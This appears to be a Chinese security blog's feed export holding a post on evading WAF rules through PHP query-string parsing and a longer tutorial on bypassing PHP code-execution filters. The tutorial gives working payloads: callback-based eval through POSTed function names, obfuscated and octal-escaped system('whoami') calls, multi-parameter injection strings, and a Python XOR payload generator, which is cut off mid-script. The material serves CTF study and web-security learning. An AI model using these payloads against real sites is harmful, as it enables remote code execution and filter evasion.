    <content type="html"><![CDATA[<h1 id="利用PHP的字符串解析特性Bypass"><a href="#利用PHP的字符串解析特性Bypass" class="headerlink" title="利用PHP的字符串解析特性Bypass"></a>利用PHP的字符串解析特性Bypass</h1><p>参考这篇文章：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>。例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">/<span class="hljs-keyword">new</span><span class="hljs-type">s</span>.php?%<span class="hljs-number">20</span><span class="hljs-keyword">new</span><span class="hljs-type">s</span>[id%<span class="hljs-number">00</span>=<span class="hljs-number">42</span><span class="hljs-string">&quot;+AND+1=0--</span><br></code></pre></td></tr></table></figure><p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p><p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><p>​    1.删除空白符</p><p>​    2.将某些字符转换为下划线（包括空格）</p><p>例如：</p><table><thead><tr><th align="center">User input</th><th align="center">Decoded PHP</th><th align="center">variable name</th></tr></thead><tbody><tr><td align="center">%20foo_bar%00</td><td align="center">foo_bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%20bar%00</td><td align="center">foo bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%5bbar</td><td align="center">foo[bar</td><td align="center">foo_bar</td></tr></tbody></table><p>通过以下这个示例，你可以更直观的看到parser_str函数如何处理字符串：</p><p><img src="D:\mdimage\1567560394_5d6f12cab5cdc.gif" alt="img"> </p><p>parse_str函数通常被自动应用于get、post请求和cookie中。如果你的Web服务器接受带有特殊字符的参数名，那么也会发生类似的情况。下面将介绍php解析函数如何处理这些特殊字符</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>.<span class="hljs-selector-attr">[1st]</span>foo_bar<br><span class="hljs-number">2</span><span class="hljs-selector-class">.foo</span><span class="hljs-selector-attr">[2nd]</span>bar<br><span class="hljs-number">3</span><span class="hljs-selector-class">.foo_bar</span><span class="hljs-selector-attr">[3rd]</span><br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\1567560438_5d6f12f680afe.jpeg" alt="img">  </p><p><img src="D:\mdimage\1567560448_5d6f13004035f.jpeg" alt="img"> </p><p>从上面的图里可以看出匹配机制</p><p>可以看出，foo%20bar和foo+bar等效，均解析为foo bar。</p><h1 id="Suricata"><a href="#Suricata" class="headerlink" title="Suricata"></a>Suricata</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP变量覆盖漏洞</title>
    <link href="/decemberus.com/2022/01/09/%E6%B5%85%E8%B0%88PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/"/>
    <url>/decemberus.com/2022/01/09/%E6%B5%85%E8%B0%88PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="php的各种绕过姿势"><a href="#php的各种绕过姿势" class="headerlink" title="php的各种绕过姿势"></a>php的各种绕过姿势</h1><h1 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h1><p>首先来看看在<code>PHP</code>中有哪些函数有代码执行的功能</p><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>最常见的代码执行函数，把<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a> code 作为PHP代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span> ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20230307190834341.png" alt="image-20230307190834341"> </p><h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><p>检查一个断言是否为<code>false</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP <span class="hljs-number">5</span><br><span class="hljs-title function_ invoke__">assert</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span> [, <span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span> ] ) : <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP <span class="hljs-number">7</span><br><span class="hljs-title function_ invoke__">assert</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span> [, <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$exception</span> ] ) : <span class="hljs-keyword">bool</span><br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p><code>assert()</code>会检查指定的<code>assertion</code>并在结果为<code>false</code>时采取适当的行动。在<code>PHP5</code>或<code>PHP7</code>中，如果<code>assertion</code>是字符串，它将会被<code>assert()</code>当做<code>PHP</code>代码来执行。</p><p><img src="D:/mdimage/image-20230307191009863.png" alt="image-20230307191009863"> 注意版本问题</p><h2 id="preg-replace-x2F-e"><a href="#preg-replace-x2F-e" class="headerlink" title="preg_replace()+&#x2F;e"></a>preg_replace()+&#x2F;e</h2><p>执行一个正则表达式的搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p>搜索<code>subject</code>中匹配<code>pattern</code>的部分，以<code>replacement</code>进行替换。如果<code>pattern</code>的模式修饰符使用<code>/e</code>，那么当<code>subject</code>被匹配成功时，<code>replacement</code>会被当做PHP代码执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS： preg_replace()+函数的/e修饰符在PHP7中被移除<br></code></pre></td></tr></table></figure><p><img src="D:\mdimage\image-20220927205346256.png" alt="image-20220927205346256"> </p><p><img src="D:/mdimage/image-20230307191803389.png" alt="image-20230307191803389">&#x2F;e 它表示将模式字符串解释为 PHP 代码并执行它，然后将执行结果作为替换字符串</p><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h2><p>创建一个匿名（lambda样式）函数</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">create_function ( <span class="hljs-built_in">string</span> $args , <span class="hljs-built_in">string</span> $code ) : <span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure><p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。如果没有严格对参数传递进行过滤，攻击者可以构造payload传递给create_function()对参数或函数体闭合注入恶意代码导致代码执行</p><p><img src="D:/mdimage/image-20220928183339905.png" alt="image-20220928183339905"> </p><p><img src="D:/mdimage/image-20220928183345893.png" alt="image-20220928183345893"> </p><h1 id="可回调函数"><a href="#可回调函数" class="headerlink" title="可回调函数"></a>可回调函数</h1><p>从前有座山。。。</p><p>在这里</p><h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h2><p>为数组的每个元素应用回调函数</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">array_map ( callable $callback ,<span class="hljs-built_in"> array </span>$array ,<span class="hljs-built_in"> array </span>...$arrays )<span class="hljs-keyword"> :</span> array<br></code></pre></td></tr></table></figure><p>返回数组，是为<code>array</code>每个元素应用<code>callback</code>函数之后的数组。 <code>array_map()</code>返回一个<code>array</code>，数组内容为<code>array1</code>的元素按索引顺序为参数调用<code>callback</code>后的结果（有更多数组时，还会传入<code>arrays</code>的元素）。 <code>callback</code>函数形参的数量必须匹配<code>array_map()</code>实参中数组的数量。</p><p>下面是一个实例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><span class="hljs-variable">$squares</span> = <span class="hljs-title function_ invoke__">array_map</span>(function(<span class="hljs-variable">$x</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable">$x</span> * <span class="hljs-variable">$x</span>; &#125;, <span class="hljs-variable">$array</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$squares</span>);<br></code></pre></td></tr></table></figure><p>利用代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$array</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;arg&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$array</span>);<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928184209095.png" alt="image-20220928184209095"> </p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>把第一个参数作为回调函数调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span> ( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> [, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$parameter</span> [, <span class="hljs-keyword">mixed</span> $... ]] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p>第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。</p><p><img src="D:/mdimage/image-20220928184819744.png" alt="image-20220928184819744"> </p><h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h2><p>调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">call_user_func_array ( callable <span class="hljs-variable">$callback</span> , array <span class="hljs-variable">$param_arr</span> ) : mixed<br></code></pre></td></tr></table></figure><p>把第一个参数作为回调函数<code>callback</code>调用，把参数数组作<code>param_arr</code>为回调函数的的参数传入。跟<code>array_map()</code>相似</p><p><img src="D:/mdimage/image-20220928184904851.png" alt="image-20220928184904851"> </p><h2 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h2><p>用回调函数过滤数组中的单元</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">array_filter ( array <span class="hljs-variable">$array</span> [, callable <span class="hljs-variable">$callback</span> [, int <span class="hljs-variable">$flag</span> = 0 ]] ) : array<br></code></pre></td></tr></table></figure><p>依次将<code>array</code>数组中的每个值传递到<code>callback</code>函数。如果<code>callback</code>函数返回<code>true</code>，则<code>array</code>数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><p><img src="D:/mdimage/image-20220928185052033.png" alt="image-20220928185052033"> </p><h2 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h2><p>使用用户自定义的比较函数对数组中的值进行排序</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">usort (<span class="hljs-built_in"> array </span>&amp;$array , callable $value_compare_func )<span class="hljs-keyword"> :</span> bool<br></code></pre></td></tr></table></figure><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p><p>漏洞如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$array</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array&#x27;</span>];<br><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$array</span>,<span class="hljs-variable">$func</span>);<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20230307194241008.png" alt="image-20230307194241008">  </p><h2 id="php可变长参数"><a href="#php可变长参数" class="headerlink" title="php可变长参数"></a>php可变长参数</h2><p>当<code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>时，php有一个<code>参数变长</code>特性</p><p>PHP支持可变长参数函数。这让我们可以在函数中传递<code>0</code>，<code>1</code>,<code>...</code>或<code>n</code>个参数。 为此，您需要在参数名称前使用<code>3</code>个省略号(点)。</p><p><code>3</code>点(<code>...</code>)概念是从<strong>PHP 5.6</strong>开始实现的可变长参数。下面来看看一个简单的例子PHP变长参数函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params">...<span class="hljs-variable">$numbers</span></span>) </span>&#123;  <br>    <span class="hljs-variable">$sum</span> = <span class="hljs-number">0</span>;  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$numbers</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$n</span>) &#123;  <br>        <span class="hljs-variable">$sum</span> += <span class="hljs-variable">$n</span>;  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$sum</span>;  <br>&#125;  <br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">10<br></code></pre></td></tr></table></figure><p>然后我们就可以就和上面的usort语句进行应用啦</p><p><img src="D:/mdimage/image-20220928190332226.png" alt="image-20220928190332226"> </p><h1 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h1><blockquote><p>字符串拼接绕过适用于绕过过滤具体关键字的限制</p><p>使用版本：PHP&gt;7</p></blockquote><p><img src="D:/mdimage/image-20220928190439600.png" alt="image-20220928190439600"> &#x2F;i是大小写绕过</p><p>可以按照下面这个方法进行构造</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(p.h.p.i.n.f.o)</span><span class="hljs-comment">()</span>;<br><span class="hljs-comment">(sy.(st)</span>.em)<span class="hljs-comment">(whoami)</span>;<br><span class="hljs-comment">(sy.(st)</span>.em)<span class="hljs-comment">(who.ami)</span>;<br><span class="hljs-comment">(s.y.s.t.e.m)</span><span class="hljs-comment">(&quot;whoami&quot;)</span>;<br>.......<br></code></pre></td></tr></table></figure><p>可以注意到上面括号中并没有使用单双引号来表示字符串，这是因为</p><blockquote><p>在PHP中不一定需要<code>引号(单引号/双引号)</code>来表示字符串。PHP支持我们声明元素的类型，比如<code>$name = (string)Decemberus;</code>，在这种情况下，<code>$name</code>就包含字符串<code>&quot;Decemberus&quot;</code>，此外，如果不显示声明类型，那么PHP会将<code>圆括号内的数据当成字符串</code>来处理</p></blockquote><p>挖坑：这一块我一脸懵逼，查了好多资料做了很多实验也没有办法说明这种做法是正确的，要么error要么warning，怪了</p><h1 id="字符串转义绕过"><a href="#字符串转义绕过" class="headerlink" title="字符串转义绕过"></a>字符串转义绕过</h1><blockquote><p>适用PHP版本：<code>PHP&gt;=7</code></p></blockquote><p><strong>注意，注意这里转义后的字符必须双引号包裹传参</strong></p><p>以八进制表示的<code>\[0–7]&#123;1,3&#125;</code>转义字符会自动适配byte（如<code>&quot;\400&quot; == “\000”</code>）<br>以十六进制的<code>\x[0–9A-Fa-f]&#123;1,2&#125;</code>转义字符表示法（如<code>“\x41&quot;</code>）<br>以Unicode表示的<code>\u&#123;[0–9A-Fa-f]+&#125;</code>字符，会输出为UTF-8字符串</p><p><img src="D:/mdimage/image-20220928191353537.png" alt="image-20220928191353537"> </p><p>另外，八进制的方法可以绕过<code>无字母传参</code>进行代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="hljs-string">&quot;\167\150\157\141\155\151&quot;</span>);<span class="hljs-comment">#system(&#x27;whoami&#x27;);</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928191455864.png" alt="image-20220928191455864"> </p><h1 id="多次传参绕过"><a href="#多次传参绕过" class="headerlink" title="多次传参绕过"></a>多次传参绕过</h1><blockquote><p>适用PHP版本：<code>无限制</code></p></blockquote><p>如果过滤了<code>引号(单引号/双引号)</code>，可以通过以下方法绕过</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><img src="D:/mdimage/image-20220928191712923.png" alt="image-20220928191712923"> </p><p>先post参数</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-number">2</span>])<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>构造了这个以后可以通过get方法传入以下参数</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span><br>?<span class="hljs-number">1</span>=system<span class="hljs-variable">&amp;2</span>=whoami<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928192306238.png" alt="image-20220928192306238"> </p><p>这里需要注意，用get传参数的时候千万别用hackerbar，否则会对url编两次码</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>也可以传入POST参数一步到位</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-number">2</span>])<span class="hljs-comment">;&amp;1=system&amp;2=whoami</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928194334185.png" alt="image-20220928194334185"> </p><h2 id="绕过过滤引号"><a href="#绕过过滤引号" class="headerlink" title="绕过过滤引号"></a>绕过过滤引号</h2><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">(<span class="hljs-name">sy.st.em</span>)(<span class="hljs-name">whoami</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="绕过参数长度限制"><a href="#绕过参数长度限制" class="headerlink" title="绕过参数长度限制"></a>绕过参数长度限制</h2><p>另外如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数</p><h3 id="多次传参"><a href="#多次传参" class="headerlink" title="多次传参"></a>多次传参</h3><p><img src="D:/mdimage/image-20220928194625171.png" alt="image-20220928194625171"> </p><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p><img src="D:/mdimage/image-20220928194645157.png" alt="image-20220928194645157"> </p><p>再次重复一下之前的可变参数操作是要求php版本&gt;5.6且&lt;7</p><h1 id="内置函数访问绕过"><a href="#内置函数访问绕过" class="headerlink" title="内置函数访问绕过"></a>内置函数访问绕过</h1><p>适用于PHP版本：Windows本地测试的是<code>PHP&gt;=7</code>可以成功，<code>PHP5</code>测试虽然报错但是并不肯定不能使用</p><p>这个可以对比ssti学习</p><p>利用这种方法首先还需要知道PHP的具体版本，因为每个版本的<code>get_defined_functions()</code>返回的值都是不一样的，这里以<code>php7.4.3</code>为准</p><p><img src="D:/mdimage/image-20220928201350557.png" alt="image-20220928201350557"> </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">php -r <span class="hljs-string">&quot;print_r(get_defined_functions());&quot;</span> <span class="hljs-string">|findstr /S &quot;</span>phpinfo<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928200928521.png" alt="image-20220928200928521"> </p><p>上面图里的266其实就是我主机上面的600，也就是phpinfo</p><p><img src="D:/mdimage/image-20220928201540021.png" alt="image-20220928201540021"> </p><p>358就是system</p><h1 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h1><p>适用PHP版本：<code>无限制</code></p><p>这一点和sql注入里面的异或注入并非一个意思</p><p>在sql注入里的异或注入中</p><p>具体规则为：</p><blockquote><p>两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），null与任何条件做异或运算都为null</p></blockquote><p>而在这里事情就变得不同了</p><h2 id="当过滤字符较多时（无参数RCE）"><a href="#当过滤字符较多时（无参数RCE）" class="headerlink" title="当过滤字符较多时（无参数RCE）"></a>当过滤字符较多时（无参数RCE）</h2><h3 id="方法一（利用位运算符）"><a href="#方法一（利用位运算符）" class="headerlink" title="方法一（利用位运算符）"></a>方法一（利用位运算符）</h3><p>在PHP中两个字符串异或之后，得到的还是一个字符串。<br>例如：我们异或 <code>?</code> 和 <code>~</code> 之后得到的是 <code>A</code></p><p><img src="D:/mdimage/20200304105440370.png" alt="图一"> </p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">字符：?         ASCII码：63           二进制：  00‭11 1111‬<br>字符：~         ASCII码：126          二进制： <span class="hljs-number"> 0111 </span>1110‬<br>异或规则：<br>1   XOR  <span class="hljs-number"> 0 </span>  =   1<br>0   XOR  <span class="hljs-number"> 1 </span>  =   1<br>0   XOR  <span class="hljs-number"> 0 </span>  =   0<br>1   XOR  <span class="hljs-number"> 1 </span>  =   0<br>上述两个字符异或得到 二进制： <span class="hljs-number"> 0100 </span>0001<br>该二进制的十进制也就是：65<br>对应的ASCII码是：A<br></code></pre></td></tr></table></figure><p>接下来看一道例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了<code>所有英文字母和数字</code>，但是我们知道ASCII码中还有很多<code>字母数字之外的字符</code>，利用这些字符进行异或可以得到我们想要的字符</p><p>PS：取ASCII表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br>payload = <span class="hljs-string">&quot;assert&quot;</span><br>strlist = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span>, <span class="hljs-number">37</span>, <span class="hljs-number">38</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">42</span>, <span class="hljs-number">43</span>, <span class="hljs-number">44</span>, <span class="hljs-number">45</span>, <span class="hljs-number">46</span>, <span class="hljs-number">47</span>, <span class="hljs-number">58</span>, <span class="hljs-number">59</span>, <span class="hljs-number">60</span>, <span class="hljs-number">61</span>, <span class="hljs-number">62</span>, <span class="hljs-number">63</span>, <span class="hljs-number">64</span>, <span class="hljs-number">91</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">95</span>, <span class="hljs-number">96</span>, <span class="hljs-number">123</span>, <span class="hljs-number">124</span>, <span class="hljs-number">125</span>, <span class="hljs-number">126</span>, <span class="hljs-number">127</span>]<br><span class="hljs-comment">#strlist是ascii表中所有非字母数字的字符十进制</span><br>str1,str2 = <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> payload:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strlist:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strlist:<br>            <span class="hljs-keyword">if</span>(i ^ j == <span class="hljs-built_in">ord</span>(char)):<br>                i = <span class="hljs-string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span 